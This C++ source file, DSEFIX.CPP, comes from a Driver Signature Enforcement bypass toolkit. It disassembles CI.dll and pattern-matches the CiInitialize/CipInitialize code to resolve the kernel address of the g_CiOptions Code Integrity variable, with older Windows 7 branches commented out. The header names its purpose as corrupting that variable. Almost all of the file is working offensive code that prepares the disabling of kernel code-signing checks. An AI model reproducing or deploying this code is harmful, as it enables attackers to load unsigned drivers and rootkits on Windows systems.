/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2023
*
*  TITLE:       DSEFIX.CPP
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  CI DSE corruption related routines.
*  Based on DSEFix v1.3
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include <Windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include "hde/hde64.h"
#include "ntbuilds.h"

#include "../driver.h"

#include <stdio.h>

#ifndef IN_REGION
#define IN_REGION(x, Base, Size) (((ULONG_PTR)(x) >= (ULONG_PTR)(Base)) && ((ULONG_PTR)(x) <= (ULONG_PTR)(Base) + (ULONG_PTR)(Size)))
#endif

ULONG KDUpCheckInstructionBlock(
    _In_ PBYTE Code,
    _In_ ULONG Offset
)
{
    ULONG offset = Offset;
    hde64s hs;

    RtlSecureZeroMemory(&hs, sizeof(hs));

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (hs.len != 3)
        return 0;

    //
    // mov     r9, rbx
    //
    if (Code[offset] != 0x4C ||
        Code[offset + 1] != 0x8B)
    {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (hs.len != 3)
        return 0;

    //
    // mov     r8, rdi
    //
    if (Code[offset] != 0x4C ||
        Code[offset + 1] != 0x8B)
    {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;
    if (hs.len != 3)
        return 0;

    //
    // mov     rdx, rsi
    //
    if (Code[offset] != 0x48 ||
        Code[offset + 1] != 0x8B)
    {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;

    if (hs.len != 2)
        return 0;

    //
    // mov     ecx, ebp
    //
    if (Code[offset] != 0x8B ||
        Code[offset + 1] != 0xCD)
    {
        return 0;
    }

    return offset + hs.len;
}

/*
* KDUQueryCiEnabled
*
* Purpose:
*
* Find g_CiEnabled variable address for Windows 7.
*
*/
/*
NTSTATUS KDUQueryCiEnabled(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ SIZE_T SizeOfImage
)
{
    NTSTATUS    ntStatus = STATUS_UNSUCCESSFUL;
    SIZE_T      c;
    LONG        rel = 0;

    *ResolvedAddress = 0;

    for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
        if (*(PDWORD)((PBYTE)ImageMappedBase + c) == 0x1d8806eb) {
            rel = *(PLONG)((PBYTE)ImageMappedBase + c + 4);
            *ResolvedAddress = ImageLoadedBase + c + 8 + rel;
            ntStatus = STATUS_SUCCESS;
            break;
        }
    }

    return ntStatus;
}
*/

/*
* KDUQueryCiOptions
*
* Purpose:
*
* Find g_CiOptions variable address.
* Depending on current Windows version it will look for target value differently.
*
* Params:
*
*   ImageMappedBase - CI.dll user mode mapped base
*   ImageLoadedBase - CI.dll kernel mode loaded base
*   ResolvedAddress - output variable to hold result value
*   NtBuildNumber   - current NT build number for search pattern switch
*
*/
NTSTATUS KDUQueryCiOptions(
    _In_ HMODULE ImageMappedBase,
    _In_ ULONG_PTR ImageLoadedBase,
    _Out_ ULONG_PTR* ResolvedAddress,
    _In_ ULONG NtBuildNumber
)
{
    PBYTE       ptrCode = NULL;
    ULONG       offset, k, expectedLength;
    LONG        relativeValue = 0;
    ULONG_PTR   resolvedAddress = 0;

    hde64s hs;

    *ResolvedAddress = 0ULL;

    ptrCode = (PBYTE)GetProcAddress(ImageMappedBase, (PCHAR)"CiInitialize");
    if (ptrCode == NULL)
        return STATUS_PROCEDURE_NOT_FOUND;

    RtlSecureZeroMemory(&hs, sizeof(hs));
    offset = 0;

    //
    // For Win7, Win8/8.1, Win10 until RS3
    //
    if (NtBuildNumber < NT_WIN10_REDSTONE3) {

        expectedLength = 5;

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == expectedLength) { //test if jmp

                //
                // jmp CipInitialize
                //
                if (ptrCode[offset] == 0xE9) {
                    relativeValue = *(PLONG)(ptrCode + offset + 1);
                    break;
                }

            }

            offset += hs.len;

        } while (offset < 256);
    }
    else {
        //
        // Everything above Win10 RS3.
        //
        expectedLength = 3;

        do {

            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == expectedLength) {

                //
                // Parameters for the CipInitialize.
                //
                k = KDUpCheckInstructionBlock(ptrCode,
                    offset);

                if (k != 0) {

                    expectedLength = 5;
                    hde64_disasm(&ptrCode[k], &hs);
                    if (hs.flags & F_ERROR)
                        break;

                    //
                    // call CipInitialize
                    //
                    if (hs.len == expectedLength) {
                        if (ptrCode[k] == 0xE8) {
                            offset = k;
                            relativeValue = *(PLONG)(ptrCode + k + 1);
                            break;
                        }
                    }

                }

            }

            offset += hs.len;

        } while (offset < 256);

    }

    if (relativeValue == 0)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    relativeValue = 0;
    offset = 0;
    expectedLength = 6;

    do {

        hde64_disasm(&ptrCode[offset], &hs);
        if (hs.flags & F_ERROR)
            break;

        if (hs.len == expectedLength) { //test if mov

            if (*(PUSHORT)(ptrCode + offset) == 0x0d89) {
                relativeValue = *(PLONG)(ptrCode + offset + 2);
                break;
            }

        }

        offset += hs.len;

    } while (offset < 256);

    if (relativeValue == 0)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    resolvedAddress = ImageLoadedBase + ptrCode - (PBYTE)ImageMappedBase;

    *ResolvedAddress = resolvedAddress;

    return STATUS_SUCCESS;
}

/*
* KDUQueryCodeIntegrityVariableAddress
*
* Purpose:
*
* Find CI variable address.
* Depending on NT version search in ntoskrnl.exe or ci.dll
*
*/
ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
    _In_ ULONG NtBuildNumber
)
{
    NTSTATUS ntStatus;
    ULONG loadedImageSize = 0;
    SIZE_T sizeOfImage = 0;
    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
    LPWSTR lpModuleName;
    HMODULE mappedImageBase;

    WCHAR szFullModuleName[MAX_PATH * 2];

/*
    if (NtBuildNumber < NT_WIN8_RTM) {
        lpModuleName = (LPWSTR)L"ntoskrnl.exe";
    }
    else {
        lpModuleName = (LPWSTR)L"CI.dll";
    }
    */

    lpModuleName = (LPWSTR)L"CI.dll";

    imageLoadedBase = driver_getKernelModule("CI.dll", &loadedImageSize);
    if (imageLoadedBase == 0) {

        printf(
            "[!] Abort, could not query \"%ls\" image base\r\n", lpModuleName);

        return 0;
    }

    szFullModuleName[0] = 0;
    if (!GetSystemDirectoryW(szFullModuleName, MAX_PATH))
        return 0;

    lstrcatW(szFullModuleName, L"\\");
    lstrcatW(szFullModuleName, lpModuleName);

    //
    // Preload module for pattern search.
    //
    mappedImageBase = LoadLibraryExW(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mappedImageBase) {

        printf_s("[+] Module \"%ls\" loaded for pattern search\r\n", lpModuleName);

/*
        if (NtBuildNumber < NT_WIN8_RTM) {

            ntStatus = supQueryImageSize(mappedImageBase,
                &sizeOfImage);

            if (NT_SUCCESS(ntStatus)) {

                ntStatus = KDUQueryCiEnabled(mappedImageBase,
                    imageLoadedBase,
                    &kernelAddress,
                    sizeOfImage);

            }

        }
        else {

            ntStatus = KDUQueryCiOptions(mappedImageBase,
                imageLoadedBase,
                &kernelAddress,
                NtBuildNumber);

        }
	*/
            ntStatus = KDUQueryCiOptions(mappedImageBase,
                imageLoadedBase,
                &kernelAddress,
                NtBuildNumber);

        if (NT_SUCCESS(ntStatus)) {

            if (IN_REGION(kernelAddress,
                imageLoadedBase,
                loadedImageSize))
            {
                Result = kernelAddress;
            }
            else {

                printf(
                    "[!] Resolved address 0x%llX does not belong required module.\r\n",
                    kernelAddress);

            }

        }
        else {

            printf(
                "[!] Failed to locate kernel variable address, NTSTATUS (0x%lX)\r\n",
                ntStatus);

        }

        FreeLibrary(mappedImageBase);

    }
    else {

        //
        // Output error.
        //
        printf(
            "[!] Could not load \"%ls\", GetLastError %lu\r\n",
            lpModuleName,
            GetLastError());

    }

    return Result;
}
